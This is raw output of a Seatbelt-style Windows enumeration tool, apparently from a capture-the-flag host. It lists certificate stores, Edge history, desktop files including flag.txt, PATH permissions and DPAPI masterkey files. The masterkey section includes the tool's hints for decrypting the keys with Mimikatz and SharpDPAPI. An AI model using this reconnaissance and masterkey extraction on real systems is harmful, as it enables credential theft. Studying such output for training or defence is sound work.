LocalMachine\Root - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
LocalMachine\Root - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\Root - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
CurrentUser\CertificateAuthority - 83DA05A9886F7658BE73ACF0A4930C0F99B92F01 (Microsoft Secure Server CA 2011) 10/18/2026 4:05:19 PM
CurrentUser\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
LocalMachine\CertificateAuthority - FEE449EE0E3965A5246F000E87FDE2A065FD89D4 (Root Agency) 12/31/2039 3:59:59 PM
CurrentUser\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
CurrentUser\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
CurrentUser\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
CurrentUser\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
CurrentUser\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
CurrentUser\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
CurrentUser\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
CurrentUser\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
CurrentUser\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
CurrentUser\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 3:59:59 PM
LocalMachine\AuthRoot - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 4:00:00 AM
LocalMachine\AuthRoot - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 10:39:16 AM
LocalMachine\AuthRoot - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 7E04DE896A3E666D00E687D33FFAD93BE83D349E (DigiCert Global Root G3) 1/15/2038 4:00:00 AM
LocalMachine\AuthRoot - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 4:59:59 PM
LocalMachine\AuthRoot - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/9/2031 4:00:00 PM
LocalMachine\AuthRoot - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 4:59:59 PM
LocalMachine\AuthRoot - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 3:59:59 PM
LocalMachine\AuthRoot - 2796BAE63F1801E277261BA0D77770028F20EEE4 (Go Daddy Class 2 Certification Authority) 6/29/2034 10:06:20 AM
LocalMachine\AuthRoot - 0563B8630D62D75ABBC8AB1E4BDFB5A899B24D43 (DigiCert Assured ID Root CA) 11/9/2031 4:00:00 PM
====== ChromiumBookmarks ======

====== ChromiumHistory ======

History (C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Default\History):

  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U5310
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=mssql+native+client+2012&cvid=7990a849e9954cb9bd0eacf1fecd0163&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDE5MTVqMGoxqAIBsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?pglt=2083&q=mssql+native+client+2012&cvid=7990a849e9954cb9bd0eacf1fecd0163&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBCDE5MTVqMGoxqAIBsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U5310
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U5310
  https://login.microsoftonline.com/
  https://learn.microsoft.com/
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releaseshttps://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.microsoft.com/
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.bing.com/
  https://www.microsoft.com/
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.bing.com/
  https://download.microsoft.com/download/A/9/8/A98CF446-A38E-4B0A-A967-F93FAB474AE0/en-US/18.2.3.0/x64/msoledbsql.msi4
  http://go.microsoft.com/fwlink/
  http://go.microsoft.com/fwlink/
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql+17&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=ole+db+driver+sql&FORM=ANAB01&PC=U531ole
  https://www.bing.com/search?q=mssql+native+client+2012&FORM=ANAB01&PC=U531mssql
  https://www.bing.com/search?q=mssql+native+client+2012&FORM=ANAB01&PC=U531mssql
  https://www.bing.com/search?q=sql+server+2017+installation+media&FORM=ANAB01&PC=U531sql
  https://www.bing.com/search?q=sql+server+2017+installation+media&FORM=ANAB01&PC=U531sql
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667d
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16https://learn.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667dhttps://www.microsoft.com/en-us/evalcenter/evaluate-sql-server-2017-rtm?msockid=2ab2bfe65c6067d117f0ab195dc3667d
  https://www.bing.com/ck/a?
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releaseshttps://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531
  https://www.bing.com/search?pglt=2083&q=ole+db+driver+sql&cvid=b92793d2f5bf41fa99d202b2faf8e330&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyMjExajBqMagCArACAQ&FORM=ANSPA1&PC=U531ole
  https://www.bing.com/ck/a?
  https://www.microsoft.com/en-US/download/details.aspx?id=50402?1558859051&msockid=2ab2bfe65c6067d117f0ab195dc3667dDownload
  https://www.bing.com/ck/a?
  https://go.microsoft.com/fwlink/p/?linkid=2196047&clcid=0x409&culture=en-us&country=usSQL
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=sql+server+2017+installation+media&cvid=16e6bc95b47b4d5e9f6227bf6c566474&gs_lcrp=EgZjaHJvbWUqBggAEAAYQDIGCAAQABhAMgYIARAAGEAyBggCEAAYQDIGCAMQABhAMgYIBBAAGEAyBggFEAAYQDIGCAYQABhAMgYIBxAAGEAyBggIEAAYQNIBCDY1NjBqMGoxqAIAsAIB&FORM=ANSPA1&PC=U531sql
  https://support.microsoft.com/en-us/silentsigninhandler
  https://support.microsoft.com/signin-oidc
  https://support.microsoft.com/en-us/topic/kb5042217-description-of-the-security-update-for-sql-server-2017-gdr-september-10-2024-664b5d51-c175-4da1-8c65-e678797b34baKB5042217
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://techcommunity.microsoft.com/t5/sql-server-blog/odbc-driver-17-for-sql-server-released/ba-p/385825ODBC
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releasesRelease
  https://learn.microsoft.com/en-us/sql/connect/oledb/download-oledb-driver-for-sql-server?view=sql-server-ver16Download
  https://learn.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-ver16Microsoft
  https://learn.microsoft.com/en-us/sql/connect/oledb/release-notes-for-oledb-driver-for-sql-server?view=sql-server-ver16#previous-releases
  https://info.microsoft.com/ww-landing-sql-server-2017-rtm.html
  https://www.bing.com/ck/a?
  https://www.bing.com/ck/a?
  https://www.bing.com/search?q=ole+db+driver+sql+17&cvid=c54b70ef8aaa452e9f20ae14a11fa87b&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIGCAEQABhAMgYIAhAAGEAyBggDEAAYQDIGCAQQABhAMgYIBRAAGEAyBggGEAAYQDIGCAcQABhAMgYICBAAGEDSAQgyNjQyajBqNKgCA7ACAQ&FORM=ANAB01&PC=U531

====== ChromiumPresence ======


  C:\Users\svc_dev\AppData\Local\Microsoft\Edge\User Data\Default\

    'History'     (9/19/2024 6:31:52 AM)  :  Run the 'ChromiumHistory' command
====== CloudCredentials ======

====== CloudSyncProviders ======

====== CredEnum ======

ERROR:   [!] Terminating exception running command 'CredEnum': System.ComponentModel.Win32Exception (0x80004005): A specified logon session does not exist. It may already have been terminated
   at AnschnallGurt.Commands.Windows.CredEnumCommand.<Execute>d__9.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== CredGuard ======

ERROR: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.CredentialGuardCommand.<Execute>d__10.MoveNext()
====== dir ======

  LastAccess LastWrite  Size      Path

  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Music\
  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Pictures\
  20-01-21   20-01-21   0B        C:\Users\svc_dev\Documents\My Videos\
  20-10-02   20-10-02   0B        C:\Users\svc_dev\Documents\SQL Server Management Studio\
  20-10-02   20-10-02   0B        C:\Users\svc_dev\Documents\Visual Studio 2017\
  26-03-24   26-03-24   7.5KB     C:\Users\svc_dev\Desktop\ascension.exe
  20-10-14   20-10-14   34B       C:\Users\svc_dev\Desktop\flag.txt
  26-03-24   26-03-24   277.8KB   C:\Users\svc_dev\Desktop\Invoke-Seatbelt.ps1
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Music\
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Pictures\
  19-10-08   19-10-08   0B        C:\Users\Default\Documents\My Videos\
====== DNSCache ======

ERROR: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at AnschnallGurt.Commands.Windows.DNSCacheCommand.<Execute>d__10.MoveNext()
====== DotNet ======

ERROR:   [!] Terminating exception running command 'DotNet': System.FormatException: Input string was not in a correct format.
   at System.Number.StringToNumber(String str, NumberStyles options, NumberBuffer& number, NumberFormatInfo info, Boolean parseDecimal)
   at System.Number.ParseInt32(String s, NumberStyles style, NumberFormatInfo info)
   at AnschnallGurt.Commands.Windows.DotNetCommand.<Execute>d__12.MoveNext()
   at AnschnallGurt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
====== DpapiMasterKeys ======

  Folder : C:\Users\svc_dev\AppData\Roaming\Microsoft\Protect\S-1-5-21-197600473-3515118913-3158175032-1003

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    1/10/2020 5:27:02 AM      1/10/2020 5:27:02 AM      29C91D6E-339C-4E04-9796-F43ACA8E1AF3
    1/10/2020 5:27:02 AM      1/10/2020 5:27:02 AM      2bf4cfc9-5473-4c95-8514-35861fcbf022
    9/17/2024 5:57:58 AM      9/17/2024 5:57:58 AM      67f368d2-3d19-4912-89fc-643c7288b37d
    10/19/2020 9:45:48 AM     10/19/2020 9:45:48 AM     93d13701-6d0b-4909-987f-daeb8e1a06df
    7/20/2020 2:40:18 AM      7/20/2020 2:40:18 AM      a6d61830-7389-4ede-b859-3142a0db5d7f
    4/2/2021 7:08:44 AM       4/2/2021 7:08:44 AM       dd067335-9e4c-441b-a3cd-a35c0be3418a


  [*] Use the Mimikatz "dpapi::masterkey" module with appropriate arguments (/pvk or /rpc) to decrypt
  [*] You can also extract many DPAPI masterkeys from memory with the Mimikatz "sekurlsa::dpapi" module
  [*] You can also use SharpDPAPI for masterkey retrieval.
====== EnvironmentPath ======

  Name                           : C:\Program Files\PHP\v7.3
  SDDL                           : O:BAD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\system32
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\Wbem
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Windows\System32\WindowsPowerShell\v1.0\
  SDDL                           : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;OICIIO;GA;;;CO)(A;OICIIO;GA;;;SY)(A;;0x1301bf;;;SY)(A;OICIIO;GA;;;BA)(A;;0x1301bf;;;BA)(A;OICIIO;GXGR;;;BU)(A;;0x1200a9;;;BU)(A;CIIO;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;OICIIO;GXGR;;;AC)(A;;0x1200a9;;;S-1-15-2-2)(A;OICIIO;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\140\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\140\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files\Microsoft SQL Server\130\Tools\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\110\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\120\DTS\Binn\
  SDDL                           : O:SYD:AI(A;ID;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;;;S-1-15-2-2)

  Name                           : C:\Program Files (x86)\Microsoft SQL Server\130\DTS\Binn\
